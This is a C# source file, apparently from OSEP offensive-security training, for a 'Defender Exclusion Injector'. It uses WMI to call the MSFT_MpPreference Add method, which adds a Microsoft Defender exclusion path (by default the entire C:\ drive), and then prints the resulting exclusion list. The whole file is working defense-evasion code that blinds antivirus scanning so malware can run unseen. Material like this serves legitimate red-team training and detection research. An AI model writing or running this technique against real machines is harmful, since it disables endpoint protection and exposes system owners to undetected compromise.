using System;
using System.Management;
using System.Collections.Generic;

namespace OSEP
{
    public class AddExclusion
    {
        public static void Main(string[] args)
        {
            string path = "C:\\";
            if (args.Length > 0)
            {
                path = args[0];
            }

            Console.WriteLine("[*] OSEP Defender Exclusion Injector (C# - Instance Edition)");
            Console.WriteLine("[*] Target Path: {0}", path);

            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\Microsoft\Windows\Defender");
                scope.Connect();

                // Query for the singleton instance of MSFT_MpPreference
                ObjectQuery query = new ObjectQuery("SELECT * FROM MSFT_MpPreference");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                
                ManagementObject mpInstance = null;
                foreach (ManagementObject obj in searcher.Get())
                {
                    mpInstance = obj;
                    break; // There is usually only one instance
                }

                if (mpInstance == null)
                {
                    Console.WriteLine("[-] ERROR: Could not find MSFT_MpPreference instance.");
                    return;
                }

                ManagementBaseObject inParams = mpInstance.GetMethodParameters("Add");
                inParams["ExclusionPath"] = new string[] { path };

                Console.WriteLine("[*] Invoking 'Add' method on Defender instance...");
                ManagementBaseObject outParams = mpInstance.InvokeMethod("Add", inParams, null);

                Console.WriteLine("[+] SUCCESS: Method invoked.");
                
                // Verification
                Console.WriteLine("[*] Current Exclusions:");
                // Refresh the instance to see new data
                searcher = new ManagementObjectSearcher(scope, query);
                foreach (ManagementObject obj in searcher.Get())
                {
                    string[] exclusions = (string[])obj["ExclusionPath"];
                    if (exclusions != null)
                    {
                        foreach (string ex in exclusions)
                        {
                            Console.WriteLine("  - {0}", ex);
                        }
                    }
                }
            }
            catch (ManagementException e)
            {
                Console.WriteLine("[-] WMI ERROR: {0} (Error Code: {1})", e.Message, e.ErrorCode);
                if ((uint)e.ErrorCode == 0x80041003) {
                    Console.WriteLine("[!] Suggestion: This error code means 'Access Denied'. Are you running as Admin?");
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[-] ERROR: Access Denied. High Integrity (Admin) is required.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: {0}", ex.Message);
            }
        }
    }
}
